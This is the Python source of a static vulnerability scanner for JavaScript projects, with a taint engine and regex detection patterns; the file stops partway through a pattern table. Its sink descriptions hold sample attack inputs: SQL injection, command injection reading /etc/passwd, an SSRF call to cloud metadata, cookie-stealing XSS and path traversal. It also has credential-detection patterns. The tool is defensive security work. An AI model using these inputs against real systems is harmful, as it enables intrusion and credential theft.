#!/usr/bin/env python3
"""
SOURCE AUDITOR PRO  (v3.1)
Single-file vulnerability scanner for JavaScript / TypeScript / HTML / JSON projects.

Stage Status
------------
  ✅  Regex Scanner
  ✅  Pattern Scanner
  ✅  Sink Detection
  ✅  Template Injection Detection
  ✅  Weak Sanitization Detection
  ✅  Severity Mapping
  ✅  Structured Reporting
  ✅  Context-Aware Analysis   (AST route/middleware inspection)
  ✅  Taint Analysis           (intraprocedural source→sink tracking)
  ✅  AST Dataflow             (esprima — variable assignments, destructuring, template literals)

v3.1 False-Positive & Duplicate Fixes
--------------------------------------
  * Timing-Unsafe Comparison: now requires comparison against a string literal or
    another secret-named variable — no longer fires on `statusToken === 200`.
  * Generic Secret: word-boundary guard — no longer fires on `tokenizer`, `password_strength`.
  * Missing Rate Limit + structural logic patterns: skipped on pure comment lines.
  * Endpoint deduplication: sub-path matches on the same line are collapsed to the
    longest match — `/api/v2/users` no longer generates two findings.
  * Taint engine shadowing: when taint analysis confirms a source→sink flow, the
    weaker regex duplicate (eval, XSS, SQLi, SSRF, CMDi, redirect, path) is suppressed.
  * Phone Number: separator is now required (not optional) to avoid matching version
    strings like `3.141.592`.
  * nosec inline suppression: append  // nosec  or  # nosec  to any line to silence
    all findings on that line (mirrors Semgrep / Bandit convention).

Requires (for AST mode)
-----------------------
  pip install esprima

Usage
-----
  Scan a folder   :  python source_auditor_pro.py <path/to/project>
  Scan from stdin :  python source_auditor_pro.py --paste
  Open GUI        :  python source_auditor_pro.py --gui
  CI mode         :  python source_auditor_pro.py ./src --json-only --severity HIGH
  No taint        :  python source_auditor_pro.py ./src --no-taint
"""

import re
import os
import sys
import json
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==============================================================================
# TAINT ENGINE  (Context-Aware Analysis + Taint Analysis + AST Dataflow)
# Fully inlined — no separate taint_engine.py needed.
# ==============================================================================

try:
    import esprima
    _ESPRIMA_OK = True
except ImportError:
    _ESPRIMA_OK = False

_TAINT_ENGINE_AVAILABLE = True   # always True — code is inlined below

from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Set, Tuple

@dataclass
class TaintFinding:
    severity:     str
    category:     str
    vuln_type:    str
    file:         str
    source_line:  int
    sink_line:    int
    source_expr:  str
    sink_expr:    str
    taint_path:   List[str]
    cwe:          str
    owasp:        str
    exploit:      str
    fix:          str
    suppressed:   bool = False
    suppression_reason: str = ""


TAINT_SOURCES: Set[str] = {
    "req.body", "req.query", "req.params", "req.headers", "req.cookies",
    "request.body", "request.query", "request.params", "request.headers",
    "process.argv", "event.data", "location.search", "location.hash",
    "document.cookie", "window.name",
}

_SOURCE_RE = re.compile(
    r"\b(?:req|request)\.(?:body|query|params|headers|cookies)"
    r"|process\.argv"
    r"|(?:location|window)\.(?:search|hash|name)"
    r"|document\.cookie|event\.data"
)


@dataclass
class Sink:
    name:        str
    match_callee: List[str]
    arg_indices: List[int]
    vuln_type:   str
    severity:    str
    cwe:         str
    owasp:       str
    exploit:     str
    fix:         str


SINKS: List[Sink] = [
    Sink(
        name="SQL via prepare/query",
        match_callee=["prepare", "query", "execute", "raw"],
        arg_indices=[0],
        vuln_type="SQL Injection",
        severity="CRITICAL",
        cwe="CWE-89", owasp="A03:2021",
        exploit=(
            "Tainted user input flows directly into a SQL query string:\n"
            "  username = \"admin' OR '1'='1\"\n"
            "  query = `SELECT * FROM users WHERE username='${username}'`\n"
            "  db.prepare(query).get()  →  returns all rows"
        ),
        fix=(
            "1. Use parameterised statements: db.prepare('SELECT … WHERE id = ?').get(id)\n"
            "2. Never interpolate req.* values into SQL strings.\n"
            "3. Use an ORM (Prisma, Sequelize, TypeORM)."
        ),
    ),
    Sink(
        name="exec / shell",
        match_callee=["exec", "execSync", "execFile", "spawn", "spawnSync",
                      "system", "popen", "shell_exec"],
        arg_indices=[0],
        vuln_type="Command Injection",
        severity="CRITICAL",
        cwe="CWE-78", owasp="A03:2021",
        exploit=(
            "Tainted input reaches a shell execution function:\n"
            "  host = req.query.host  // '8.8.8.8; cat /etc/passwd'\n"
            "  exec(`ping -c 1 ${host}`)  →  Remote Code Execution"
        ),
        fix=(
            "1. Use execFile() with an argument array:\n"
            "     execFile('ping', ['-c', '1', host], callback)\n"
            "2. Validate input against a strict allowlist."
        ),
    ),
    Sink(
        name="eval",
        match_callee=["eval", "Function"],
        arg_indices=[0],
        vuln_type="Code Injection via eval()",
        severity="CRITICAL",
        cwe="CWE-94", owasp="A03:2021",
        exploit="Tainted input evaluated as JavaScript code:\n  eval(req.body.code)  →  arbitrary JS execution",
        fix="1. Remove all uses of eval() and new Function().\n2. Use JSON.parse() for data.",
    ),
    Sink(
        name="SSRF (axios/fetch/http)",
        match_callee=["axios.get", "axios.post", "axios.request", "axios",
                      "fetch", "http.get", "https.get", "request", "got"],
        arg_indices=[0],
        vuln_type="Server-Side Request Forgery (SSRF)",
        severity="CRITICAL",
        cwe="CWE-918", owasp="A10:2021",
        exploit=(
            "Tainted URL reaches an outbound HTTP call:\n"
            "  url = req.body.url  // 'http://169.254.169.254/latest/meta-data/'\n"
            "  axios.get(url)  →  cloud credentials and internal services exposed"
        ),
        fix=(
            "1. Validate URLs against an allowlist of permitted domains.\n"
            "2. Block private/loopback IP ranges before fetching."
        ),
    ),
    Sink(
        name="res.send/json (XSS reflection)",
        match_callee=["res.send", "res.json", "res.write", "res.end",
                      "response.send", "response.json"],
        arg_indices=[-1],
        vuln_type="Reflected XSS / Information Disclosure",
        severity="HIGH",
        cwe="CWE-79", owasp="A03:2021",
        exploit=(
            "Tainted request data reflected directly in the response:\n"
            "  GET /search?q=<script>alert(document.cookie)</script>\n"
            "  res.send(req.query.q)  →  XSS in browser"
        ),
        fix=(
            "1. HTML-encode all user data before embedding in HTML.\n"
            "2. Use a template engine with auto-escaping.\n"
            "3. Implement a strict Content Security Policy."
        ),
    ),
    Sink(
        name="innerHTML",
        match_callee=["innerHTML", "outerHTML"],
        arg_indices=[-1],
        vuln_type="DOM-based XSS via innerHTML",
        severity="HIGH",
        cwe="CWE-79", owasp="A03:2021",
        exploit="Tainted data written to innerHTML executes embedded event handlers.",
        fix="1. Use textContent for plain text.\n2. Sanitise with DOMPurify.sanitize().",
    ),
    Sink(
        name="redirect",
        match_callee=["res.redirect", "window.location"],
        arg_indices=[0],
        vuln_type="Open Redirect",
        severity="HIGH",
        cwe="CWE-601", owasp="A01:2021",
        exploit="Tainted URL used as redirect destination → phishing.",
        fix="1. Validate redirect targets against an allowlist.\n2. Only allow relative paths.",
    ),
    Sink(
        name="path operations",
        match_callee=["path.join", "path.resolve", "fs.readFile",
                      "fs.readFileSync", "fs.writeFile", "fs.writeFileSync",
                      "fs.createReadStream", "fs.createWriteStream", "require"],
        arg_indices=[0, 1],
        vuln_type="Path Traversal",
        severity="CRITICAL",
        cwe="CWE-22", owasp="A01:2021",
        exploit=(
            "Tainted path component used in a file operation:\n"
            "  filename = req.query.file  // '../../etc/passwd'\n"
            "  fs.readFile(path.join(__dirname, filename), ...)  →  arbitrary file read"
        ),
        fix=(
            "1. Resolve the full path and assert it starts with the expected base directory.\n"
            "2. Reject any input containing '..'."
        ),
    ),
]

_SINK_MAP: Dict[str, Sink] = {}
for _s in SINKS:
    for _m in _s.match_callee:
        _SINK_MAP[_m] = _s


SANITIZERS: Set[str] = {
    "escape", "escapeString", "sanitize", "sanitizeSQL",
    "shellescape", "shellEscape", "escapeShellArg",
    "DOMPurify.sanitize", "sanitizeHtml", "xss", "he.escape",
    "escapeHtml", "htmlEscape", "htmlspecialchars",
    "encodeURIComponent", "encodeURI",
    "path.basename",
    "validator.escape", "validator.blacklist",
    "Joi.string", "yup.string",
    "db.prepare",
}

TEST_FILE_PATTERNS = re.compile(
    r"(?:\.test\.|\.spec\.|__tests__|/tests?/|/test/)", re.IGNORECASE
)

AUTH_GUARD_CALLS = {
    "authRequired", "requireAuth", "isAuthenticated", "authenticate",
    "passport.authenticate", "verifyToken", "checkAuth", "ensureLoggedIn",
    "requireLogin", "protect",
}

RATE_LIMIT_CALLS = {
    "rateLimit", "rateLimiter", "expressRateLimit", "slowDown",
    "limiter", "apiLimiter", "loginLimiter",
}


def _node_line(node: dict) -> int:
    loc = node.get("loc") or {}
    return (loc.get("start") or {}).get("line", 0)


def _node_text(node: dict, source_lines: List[str]) -> str:
    if not node or not source_lines:
        return ""
    loc = node.get("loc") or {}
    start = loc.get("start") or {}
    end   = loc.get("end")   or {}
    sl, sc = start.get("line", 1) - 1, start.get("column", 0)
    el, ec = end.get("line",   1) - 1, end.get("column", 0)
    if sl == el:
        return source_lines[sl][sc:ec] if sl < len(source_lines) else ""
    lines = [source_lines[sl][sc:]]
    for i in range(sl + 1, min(el, len(source_lines))):
        lines.append(source_lines[i])
    if el < len(source_lines):
        lines.append(source_lines[el][:ec])
    return " ".join(l.strip() for l in lines)


def walk(node, visitor):
    if not isinstance(node, dict):
        return
    if visitor(node):
        return
    for val in node.values():
        if isinstance(val, dict):
            walk(val, visitor)
        elif isinstance(val, list):
            for item in val:
                if isinstance(item, dict):
                    walk(item, visitor)


def callee_name(node: dict) -> str:
    if node.get("type") == "Identifier":
        return node.get("name", "")
    if node.get("type") == "MemberExpression":
        obj  = callee_name(node.get("object", {}))
        prop = node.get("property", {}).get("name", "")
        return f"{obj}.{prop}" if obj else prop
    return ""


def member_chain(node: dict) -> str:
    if node.get("type") == "Identifier":
        return node.get("name", "")
    if node.get("type") == "MemberExpression":
        obj  = member_chain(node.get("object", {}))
        prop = node.get("property", {}).get("name", "")
        return f"{obj}.{prop}" if obj else prop
    return ""


class TaintState:
    def __init__(self):
        self._vars: Dict[str, Tuple[bool, str, int, List[str]]] = {}

    def taint(self, name: str, source_expr: str, source_line: int,
              path: Optional[List[str]] = None):
        self._vars[name] = (True, source_expr, source_line, path or [])

    def propagate(self, dest: str, src_name: str):
        info = self._vars.get(src_name)
        if info and info[0]:
            _, source_expr, source_line, path = info
            self._vars[dest] = (True, source_expr, source_line, path + [src_name])

    def mark_clean(self, name: str):
        self._vars[name] = (False, "", 0, [])

    def is_tainted(self, name: str) -> bool:
        info = self._vars.get(name)
        return bool(info and info[0])

    def get(self, name: str):
        return self._vars.get(name)

    def snapshot(self) -> dict:
        return dict(self._vars)

    def restore(self, snap: dict):
        self._vars = dict(snap)


class TaintEngine:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose

    def scan_file(self, filepath: str, source: str) -> List[TaintFinding]:
        findings: List[TaintFinding] = []
        if TEST_FILE_PATTERNS.search(filepath):
            return findings
        if not _ESPRIMA_OK:
            findings.extend(self._regex_taint_fallback(filepath, source))
            return findings
        try:
            tree = esprima.parseScript(source, tolerant=True, loc=True, jsx=False)
            ast = tree.toDict()
        except Exception as exc:
            if self.verbose:
                print(f"  [AST] Parse error in {filepath}: {exc}", file=sys.stderr)
            findings.extend(self._regex_taint_fallback(filepath, source))
            return findings
        source_lines = source.splitlines()
        findings.extend(self._analyse_program(ast, filepath, source_lines))
        return findings

    def _analyse_program(self, ast: dict, filepath: str,
                         source_lines: List[str]) -> List[TaintFinding]:
        findings: List[TaintFinding] = []
        global_state = TaintState()
        self._process_body(ast.get("body", []), global_state,
                           filepath, source_lines, findings, collect_only=True)
        seen_functions: Set[int] = set()

        def visit_function(node):
            nid = id(node)
            if nid in seen_functions:
                return True
            seen_functions.add(nid)
            if node.get("type") not in (
                "FunctionDeclaration", "FunctionExpression", "ArrowFunctionExpression",
            ):
                return False
            fn_state = TaintState()
            fn_state.restore(global_state.snapshot())
            params = node.get("params", [])
            for i, p in enumerate(params):
                if p.get("type") == "Identifier":
                    pname = p.get("name", "")
                    if i == 0 and pname not in ("err", "error"):
                        fn_state.taint(pname, f"{pname} (request parameter)", _node_line(node))
            body = node.get("body", {})
            if body.get("type") == "BlockStatement":
                self._process_body(body.get("body", []), fn_state, filepath, source_lines, findings)
            return False

        walk(ast, visit_function)
        return findings

    def _process_body(self, stmts: list, state: TaintState,
                      filepath: str, source_lines: List[str],
                      findings: List[TaintFinding], collect_only: bool = False):
        for stmt in stmts:
            if not isinstance(stmt, dict):
                continue
            t = stmt.get("type", "")
            if t == "VariableDeclaration":
                for decl in stmt.get("declarations", []):
                    self._process_declarator(decl, state, filepath, source_lines, findings, collect_only)
            elif t == "ExpressionStatement":
                expr = stmt.get("expression", {})
                if not collect_only:
                    self._process_expr(expr, state, filepath, source_lines, findings)
            elif t in ("IfStatement", "WhileStatement", "ForStatement",
                       "ForInStatement", "ForOfStatement"):
                for key in ("consequent", "alternate", "body"):
                    branch = stmt.get(key)
                    if isinstance(branch, dict):
                        branch_stmts = branch.get("body", [branch])
                        self._process_body(branch_stmts, state, filepath, source_lines, findings, collect_only)
            elif t == "TryStatement":
                block = stmt.get("block", {})
                self._process_body(block.get("body", []), state, filepath, source_lines, findings, collect_only)
                handler = stmt.get("handler")
                if handler:
                    self._process_body(handler.get("body", {}).get("body", []),
                                       state, filepath, source_lines, findings, collect_only)
            elif t == "ReturnStatement":
                arg = stmt.get("argument")
                if arg and not collect_only:
                    self._process_expr(arg, state, filepath, source_lines, findings)

    def _process_declarator(self, decl: dict, state: TaintState,
                             filepath: str, source_lines: List[str],
                             findings: List[TaintFinding], collect_only: bool = False):
        lhs  = decl.get("id",   {})
        init = decl.get("init", {})
        if not init:
            return
        tainted, source_expr, source_line, path = self._expr_taint(
            init, state, filepath, source_lines, findings, collect_only)
        lhs_type = lhs.get("type", "")
        if lhs_type == "Identifier":
            name = lhs.get("name", "")
            if tainted:
                state.taint(name, source_expr, source_line, path)
            elif self._is_sanitizer(init):
                state.mark_clean(name)
        elif lhs_type == "ObjectPattern":
            for prop in lhs.get("properties", []):
                val_node = prop.get("value", {})
                val_name = val_node.get("name", "") if val_node else ""
                if val_name and tainted:
                    state.taint(val_name, f"{source_expr}.{val_name}", source_line, path)
        elif lhs_type == "ArrayPattern":
            for elem in lhs.get("elements", []):
                if elem and elem.get("type") == "Identifier" and tainted:
                    state.taint(elem["name"], source_expr, source_line, path)

    def _expr_taint(self, node: dict, state: TaintState,
                    filepath: str, source_lines: List[str],
                    findings: List[TaintFinding], collect_only: bool = False
                    ) -> Tuple[bool, str, int, List[str]]:
        if not node:
            return False, "", 0, []
        t = node.get("type", "")
        if t in ("Literal", "RegExpLiteral", "TemplateElement"):
            return False, "", 0, []
        if t == "Identifier":
            name = node.get("name", "")
            info = state.get(name)
            if info and info[0]:
                return True, info[1], info[2], info[3] + [name]
            return False, "", 0, []
        if t == "MemberExpression":
            chain = member_chain(node)
            for src in TAINT_SOURCES:
                if chain == src or chain.startswith(src + "."):
                    return True, chain, _node_line(node), []
            obj_taint, src_expr, src_line, path = self._expr_taint(
                node.get("object", {}), state, filepath, source_lines, findings, collect_only)
            if obj_taint:
                return True, src_expr, src_line, path
            return False, "", 0, []
        if t == "TemplateLiteral":
            for expr in node.get("expressions", []):
                tainted, src_expr, src_line, path = self._expr_taint(
                    expr, state, filepath, source_lines, findings, collect_only)
                if tainted:
                    return True, src_expr, src_line, path
            return False, "", 0, []
        if t in ("BinaryExpression", "LogicalExpression"):
            for side in ("left", "right"):
                tainted, src_expr, src_line, path = self._expr_taint(
                    node.get(side, {}), state, filepath, source_lines, findings, collect_only)
                if tainted:
                    return True, src_expr, src_line, path
            return False, "", 0, []
        if t == "AssignmentExpression":
            tainted, src_expr, src_line, path = self._expr_taint(
                node.get("right", {}), state, filepath, source_lines, findings, collect_only)
            lhs = node.get("left", {})
            if lhs.get("type") == "Identifier":
                name = lhs.get("name", "")
                if tainted:
                    state.taint(name, src_expr, src_line, path)
                elif self._is_sanitizer(node.get("right", {})):
                    state.mark_clean(name)
            return tainted, src_expr, src_line, path
        if t == "CallExpression":
            if not collect_only:
                self._process_expr(node, state, filepath, source_lines, findings)
            callee = node.get("callee", {})
            if not self._is_sanitizer(callee):
                for arg in node.get("arguments", []):
                    tainted, src_expr, src_line, path = self._expr_taint(
                        arg, state, filepath, source_lines, findings, collect_only)
                    if tainted:
                        return True, src_expr, src_line, path
            return False, "", 0, []
        if t == "ObjectExpression":
            for prop in node.get("properties", []):
                val = prop.get("value", {})
                tainted, src_expr, src_line, path = self._expr_taint(
                    val, state, filepath, source_lines, findings, collect_only)
                if tainted:
                    return True, src_expr, src_line, path
            return False, "", 0, []
        if t == "ArrayExpression":
            for elem in node.get("elements", []) or []:
                if elem:
                    tainted, src_expr, src_line, path = self._expr_taint(
                        elem, state, filepath, source_lines, findings, collect_only)
                    if tainted:
                        return True, src_expr, src_line, path
            return False, "", 0, []
        if t == "SpreadElement":
            return self._expr_taint(node.get("argument", {}), state,
                                    filepath, source_lines, findings, collect_only)
        if t == "ConditionalExpression":
            for key in ("consequent", "alternate"):
                tainted, src_expr, src_line, path = self._expr_taint(
                    node.get(key, {}), state, filepath, source_lines, findings, collect_only)
                if tainted:
                    return True, src_expr, src_line, path
            return False, "", 0, []
        return False, "", 0, []

    def _process_expr(self, node: dict, state: TaintState,
                      filepath: str, source_lines: List[str],
                      findings: List[TaintFinding]):
        if not node or node.get("type") != "CallExpression":
            return
        callee = node.get("callee", {})
        cname  = callee_name(callee)
        args   = node.get("arguments", [])
        line   = _node_line(node)
        sink = self._match_sink(cname)
        if sink:
            indices = sink.arg_indices
            check_args = args if indices == [-1] else [
                args[i] for i in indices if i < len(args)]
            for arg in check_args:
                tainted, src_expr, src_line, path = self._expr_taint(
                    arg, state, filepath, source_lines, findings)
                if tainted:
                    suppressed, reason = self._check_suppression(arg, state, filepath, source_lines, cname)
                    sink_text = _node_text(node, source_lines)[:120]
                    findings.append(TaintFinding(
                        severity=sink.severity,
                        category="taint",
                        vuln_type=sink.vuln_type,
                        file=filepath,
                        source_line=src_line,
                        sink_line=line,
                        source_expr=src_expr,
                        sink_expr=sink_text,
                        taint_path=path,
                        cwe=sink.cwe,
                        owasp=sink.owasp,
                        exploit=sink.exploit,
                        fix=sink.fix,
                        suppressed=suppressed,
                        suppression_reason=reason,
                    ))
                    break
        # Recurse into argument sub-calls (e.g. foo(bar(tainted)))
        for arg in args:
            self._process_expr(arg, state, filepath, source_lines, findings)
        # Recurse into callee chain for chained calls: db.prepare(query).get()
        # The callee is a MemberExpression whose object may be a CallExpression sink.
        if callee.get("type") == "MemberExpression":
            callee_obj = callee.get("object", {})
            if callee_obj.get("type") == "CallExpression":
                self._process_expr(callee_obj, state, filepath, source_lines, findings)

    def _match_sink(self, cname: str) -> Optional[Sink]:
        if not cname:
            return None
        if cname in _SINK_MAP:
            return _SINK_MAP[cname]
        for fragment, sink in _SINK_MAP.items():
            if cname.endswith("." + fragment) or cname == fragment:
                return sink
        return None

    def _is_sanitizer(self, node: dict) -> bool:
        if not node:
            return False
        t = node.get("type", "")
        if t == "CallExpression":
            cname = callee_name(node.get("callee", {}))
            return cname in SANITIZERS or any(cname.endswith("." + s) for s in SANITIZERS)
        if t == "Identifier":
            return node.get("name", "") in SANITIZERS
        return False

    def _check_suppression(self, arg_node: dict, state: TaintState,
                           filepath: str, source_lines: List[str],
                           sink_name: str) -> Tuple[bool, str]:
        if self._is_sanitizer(arg_node):
            return True, "argument is wrapped in a sanitizer"
        if arg_node.get("type") == "Identifier":
            name = arg_node.get("name", "")
            info = state.get(name)
            if info and not info[0]:
                return True, f"variable '{name}' was sanitised before this call"
        return False, ""

    def _regex_taint_fallback(self, filepath: str, source: str) -> List[TaintFinding]:
        findings: List[TaintFinding] = []
        lines = source.splitlines()
        tainted_vars: Dict[str, Tuple[str, int]] = {}
        _ASSIGN  = re.compile(r"(?:const|let|var)\s+(\w+)\s*=\s*(req\.(?:body|query|params|headers|cookies)\S*)")
        _DEST_RE = re.compile(r"(?:const|let|var)\s+\{([^}]+)\}\s*=\s*(req\.\w+)")
        _SQL_RE  = re.compile(r"`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)[^`]*\$\{(\w+)")
        for i, line in enumerate(lines, 1):
            m = _ASSIGN.search(line)
            if m:
                tainted_vars[m.group(1)] = (m.group(2), i)
            m2 = _DEST_RE.search(line)
            if m2:
                src = m2.group(2)
                for vname in re.split(r"[\s,]+", m2.group(1)):
                    vname = vname.strip()
                    if vname:
                        tainted_vars[vname] = (f"{src}.{vname}", i)
            m3 = _SQL_RE.search(line)
            if m3:
                vname = m3.group(1)
                if vname in tainted_vars:
                    src_expr, src_line = tainted_vars[vname]
                    findings.append(TaintFinding(
                        severity="CRITICAL", category="taint",
                        vuln_type="SQL Injection",
                        file=filepath, source_line=src_line, sink_line=i,
                        source_expr=src_expr, sink_expr=line.strip()[:120],
                        taint_path=[vname], cwe="CWE-89", owasp="A03:2021",
                        exploit="Tainted user data interpolated into SQL template literal.",
                        fix="Use parameterised statements: db.prepare('... WHERE id = ?').get(id)",
                        suppressed=False,
                    ))
        return findings


class ContextChecker:
    def scan_file(self, filepath: str, source: str) -> List[TaintFinding]:
        findings: List[TaintFinding] = []
        if not _ESPRIMA_OK:
            return findings
        try:
            tree = esprima.parseScript(source, tolerant=True, loc=True)
            ast  = tree.toDict()
        except Exception:
            return findings
        source_lines = source.splitlines()
        self._check_routes(ast, filepath, source_lines, findings)
        return findings

    def _check_routes(self, ast: dict, filepath: str,
                      source_lines: List[str], findings: List[TaintFinding]):
        SENSITIVE_ROUTE_RE = re.compile(
            r"(?:login|register|signup|auth|reset|forgot|admin|dashboard|"
            r"upload|export|delete|users|config|settings|debug|health|env)",
            re.IGNORECASE,
        )

        def visit(node):
            if node.get("type") != "CallExpression":
                return False
            callee = node.get("callee", {})
            cname  = callee_name(callee)
            parts  = cname.split(".")
            if len(parts) < 2 or parts[-1] not in ("get","post","put","delete","patch","all","use"):
                return False
            args = node.get("arguments", [])
            if not args:
                return False
            first = args[0]
            if first.get("type") != "Literal":
                return False
            route_path = str(first.get("value", ""))
            middleware_names: Set[str] = set()
            for arg in args[1:]:
                t = arg.get("type", "")
                if t == "Identifier":
                    middleware_names.add(arg.get("name", ""))
                elif t == "CallExpression":
                    middleware_names.add(callee_name(arg.get("callee", {})))
            has_auth       = bool(middleware_names & AUTH_GUARD_CALLS)
            has_rate_limit = bool(middleware_names & RATE_LIMIT_CALLS)
            is_sensitive   = bool(SENSITIVE_ROUTE_RE.search(route_path))
            is_auth_route  = bool(re.search(r"login|register|signup|reset|forgot", route_path, re.IGNORECASE))
            line = _node_line(node)
            if is_auth_route and not has_rate_limit:
                findings.append(TaintFinding(
                    severity="MEDIUM", category="context",
                    vuln_type="Missing Rate Limit on Auth Route",
                    file=filepath, source_line=line, sink_line=line,
                    source_expr=route_path, sink_expr=cname, taint_path=[],
                    cwe="CWE-307", owasp="A07:2021",
                    exploit=(
                        f"Route {route_path} has no rate-limit middleware.\n"
                        "Attacker can brute-force at thousands of req/sec with no lockout."
                    ),
                    fix=(
                        "1. Apply express-rate-limit to all auth routes.\n"
                        "2. Implement account lockout after N failed attempts.\n"
                        "3. Add CAPTCHA on login and registration forms."
                    ),
                ))
            if is_sensitive and not has_auth and not is_auth_route:
                findings.append(TaintFinding(
                    severity="HIGH", category="context",
                    vuln_type="Sensitive Route Missing Auth Middleware",
                    file=filepath, source_line=line, sink_line=line,
                    source_expr=route_path, sink_expr=cname, taint_path=[],
                    cwe="CWE-306", owasp="A01:2021",
                    exploit=(
                        f"Route {route_path} passes through no recognised auth middleware.\n"
                        "Unauthenticated attacker can access it directly."
                    ),
                    fix=(
                        "1. Add authRequired as middleware:\n"
                        f"     app.get('{route_path}', authRequired, handler)\n"
                        "2. Verify server re-checks auth on every request."
                    ),
                ))
            return False

        walk(ast, visit)

# ==============================================================================
# TUNABLES
# ==============================================================================

MAX_FILE_MB   = 10          # Files larger than this are skipped
DEFAULT_WORKERS = min(8, (os.cpu_count() or 1))

# ==============================================================================
# DETECTION PATTERNS  (compiled once at module load)
# ==============================================================================

# Each entry: (display_name, compiled_pattern)
_SECRET_RAW = {
    "AWS Access Key":       r"AKIA[0-9A-Z]{16}",
    "GitHub Token":         r"ghp_[A-Za-z0-9]{36}",
    "Stripe Live Key":      r"sk_live_[A-Za-z0-9]{24,}",
    "Slack Token":          r"xox[baprs]-[0-9A-Za-z-]{10,}",
    # Google key MUST come before Firebase so the longer/more-specific one wins
    "Google API Key":       r"AIza[0-9A-Za-z\-_]{35}",
    # Firebase keys are shorter — match only if NOT already caught as Google
    "Firebase API Key":     r"AIza[0-9A-Za-z\-_]{10,34}(?![0-9A-Za-z\-_])",
    "JWT Token":            r"eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+",
    "Bearer Token":         r"Bearer\s+[A-Za-z0-9\-_\.]{20,}",
    "Private Key Block":    r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    # Catches: secret: 'value', session({secret: "..."})
    "Hardcoded Session Secret": r"(?i)session\s*\(\s*\{[^}]*secret\s*:\s*['\"][^'\"]{6,}['\"]",
    # Catches: secret: 'val', apiKey: 'val', password: 'val' assignments
    "Generic Secret":       r"(?i)(?<![a-zA-Z_])(?:secret|api_key|apikey|token|password)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
}

_ENDPOINT_RAW = [
    r"/api/[a-zA-Z0-9_/\-]+",
    r"/admin/[a-zA-Z0-9_/\-]*",
    r"/debug(?:/[a-zA-Z0-9_/\-]*)?",
    r"https?://[^\s\"'`>]{8,}",
    r"localhost:\d{2,5}",
    r"/graphql(?:/[a-zA-Z0-9_/\-]*)?",
    r"/v\d+/[a-zA-Z0-9_/\-]+",
    r"/internal/[a-zA-Z0-9_/\-]*",
    r"/(?:swagger|openapi|docs)(?:/[a-zA-Z0-9_/\-]*)?",
]

_CONFIG_RAW = {
    "Debug Enabled":        r"(?i)\bdebug\s*[=:]\s*true\b",
    "Dev Environment":      r"""NODE_ENV\s*[=:]\s*['"]development['"]""",
    # Fixed: quantifier was {1} — should be {2} to match a.b.c.d
    "Internal IP":          r"\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.(?:\d{1,3}\.){2}\d{1,3}\b",
    "CORS Wildcard":        r"Access-Control-Allow-Origin\s*:\s*\*",
    "Hardcoded DB URL":     r"(?i)(?:mongodb(?:\+srv)?|mysql|postgres(?:ql)?|redis|mssql)://[^\s'\"`,]{8,}",
    "Verbose Errors":       r"(?i)(?:stack_trace|show_errors|display_errors)\s*[:=]\s*(?:true|1|on)\b",
    "HTTP not HTTPS":       r"http://(?!localhost)[a-zA-Z0-9.\-]+",
    "SSL Verification Off": r"(?i)(?:ssl_verify|verify_ssl|tls_verify|rejectUnauthorized)\s*[:=]\s*(?:false|0|off)\b",
    "Insecure Cookie":      r"(?i)(?:secure\s*:\s*false|httpOnly\s*:\s*false)",
    "Hardcoded Port":       r"(?i)\.listen\s*\(\s*(?:80|8080|8443|3000|5000)\s*\)",
}

_LOGIC_RAW = {
    "Client-side Auth Bypass":      r"\bisAuthenticated\s*=\s*true\b",
    "Client-side Role Check":       r"""role\s*(?:==|===)\s*['"]admin['"]""",
    "Payment Amount Bypass":        r"\bamount\s*<=?\s*0\b",
    "Unsafe eval()":                r"\beval\s*\(",
    "Unsafe new Function()":        r"\bnew\s+Function\s*\(",
    "Direct innerHTML Write":       r"\.innerHTML\s*=(?!=)",   # not ==
    "dangerouslySetInnerHTML":      r"dangerouslySetInnerHTML",
    # Template-literal SQLi: catches `WHERE x='${req.` and `WHERE id=${req.`
    "SQL Injection (Template Literal)": r"(?i)`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|WHERE|FROM|DROP|UNION)[^`]*\$\{(?:req\.|params\.|query\.|body\.|\w+)",
    # Classic string-concatenation SQLi
    "SQL String Concatenation":     r"""(?i)(?:["'`]|\$\{)[^"'`]*(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^"'`]*["'`\}].*?\+|(?:SELECT|INSERT|UPDATE|DELETE|DROP|UNION).*?\+\s*(?:req\.|params\.|query\.|body\.)""",
    # exec/execSync with a variable (not a hardcoded string literal)
    "Command Injection Sink":       r"(?i)\b(?:exec|execSync|spawn|execFile)\s*\(\s*(?!(?:'[^']*'|\"[^\"]*\")[\s,)])[^,)]+",
    "SSRF Sink":                    r"(?i)(?:axios|fetch|http\.get|https\.get|request|got)\s*\.\s*(?:get|post|request|put|delete)\s*\(\s*(?:req\.|params\.|query\.|body\.|\w+url|\w+Url|\w+URL)",
    "SSRF via fetch/axios":         r"(?i)(?:axios|fetch)\s*\(\s*(?:req\.|params\.|query\.|body\.|\w+(?:url|Url|URL))",
    "Information Disclosure (env)": r"(?i)(?:res\.(?:json|send))\s*\([^)]*(?:process\.env|req\.session|req\.headers)[^)]*\)",
    "Plaintext Password Storage":   r"(?i)\.(?:run|query|execute)\s*\([^)]*password[^)]*\)",
    "Prototype Pollution":          r"(?:__proto__|constructor\.prototype)\s*[\[.]",
    "Open Redirect":                r"(?i)(?:window\.location|res\.redirect|location\.href)\s*[=(]\s*req\.",
    "Weak Hashing Algorithm":       r"(?i)\bcrypto\.createHash\s*\(\s*['\"](?:md5|sha1)['\"]|\b(?:md5|sha1)\s*\(",
    # Requires comparison against a string literal — avoids statusToken===200 and null checks
    "Timing-Unsafe Comparison":     r"(?i)(?:token|secret|password|api_?key|auth)\w*\s*(?:===|!==)\s*(?![0-9]|null\b|undefined\b|true\b|false\b)[\"']|(?<![0-9])[\"'][^\"']{3,}[\"']\s*(?:===|!==)\s*\w*(?:token|secret|password|api_?key|auth)",
    "Path Traversal":               r"""(?:req\.(?:params|query|body)\.\w+).*?(?:\.\.|%2e%2e|%252e)|\.\./""",
    "Insecure Deserialization":     r"(?i)\b(?:unserialize|yaml\.load\b|pickle\.loads|eval\s*\(JSON)",
